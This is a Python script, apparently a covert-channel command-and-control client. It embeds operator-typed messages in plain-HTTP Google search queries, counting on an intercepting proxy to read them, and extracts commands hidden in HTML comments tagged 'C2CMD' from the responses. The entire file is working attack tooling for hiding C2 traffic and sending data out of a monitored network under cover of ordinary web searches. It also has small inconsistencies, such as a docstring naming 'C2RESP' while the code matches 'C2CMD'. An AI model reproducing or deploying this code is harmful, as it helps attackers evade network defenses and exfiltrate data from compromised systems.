import socket
import re

# Target host and port for the outbound request
# This is intentionally HTTP because the proxy will intercept and strip TLS
GOOGLE_IP = "www.google.com"
GOOGLE_PORT = 80

def send_google_search(query):
    """
    Send a raw HTTP GET request to Google with the covert message
    embedded in the search query parameter (?q=<message>).
    Returns the full raw HTTP response (headers + body).
    """
    # Build a minimal HTTP request manually
    request = (
    "GET /search?q={} HTTP/1.1\r\n"
    "Host: www.google.com\r\n"
    "Connection: close\r\n\r\n"
    ).format(query)
    
    # Create a TCP socket and send the request
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((GOOGLE_IP, GOOGLE_PORT))
        s.sendall(request.encode())

        # Receive the entire HTTP response in chunks
        response = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk

    return response


def extract_response(content):
    """
    Parse the returned HTML for a covert response.
    Looks for a hidden HTML comment of the form:
    <!-- C2RESP:<data> -->
    """
    try:
        html = content.decode(errors="ignore")
        match = re.search(r'<!-- C2CMD:(.*?) -->', html, re.DOTALL)
        if match:
            print("[+] Covert Response Extracted: {}".format(match.group(1).strip()), flush=True)
    except Exception:
        print("No Response Encoded!")
        pass




if __name__ == "__main__":
    
    
    while True:
        # Example covert message to send in the query string
        search_term = input("Covert Message >>>")
        
        #search_term = "covert+channel"
        print("[CLIENT] Sending Google search for: {}".format(search_term), flush=True)

        # Send the request and get back the raw HTTP response
        resp = send_google_search(search_term)

        print(extract_response(resp))